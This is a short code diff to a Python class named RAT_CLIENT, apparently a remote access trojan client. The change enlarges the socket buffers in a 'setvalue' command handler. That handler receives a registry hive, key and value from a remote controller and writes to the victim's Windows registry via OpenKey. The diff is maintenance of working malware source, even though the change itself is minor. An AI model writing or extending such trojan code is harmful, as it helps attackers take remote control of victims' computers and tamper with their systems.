@@ -140,10 +140,10 @@ class RAT_CLIENT:
                 s.send(link.encode())
 
             elif command == 'setvalue':
-                const = s.recv(1024).decode()
-                root = s.recv(1024).decode()
-                key2 = s.recv(1024).decode()
-                value = s.recv(1024).decode()
+                const = s.recv(2048).decode()
+                root = s.recv(2048).decode()
+                key2 = s.recv(2048).decode()
+                value = s.recv(2048).decode()
                 try:
                     if const == 'HKEY_CURRENT_USER':
                         key = OpenKey(HKEY_CURRENT_USER,
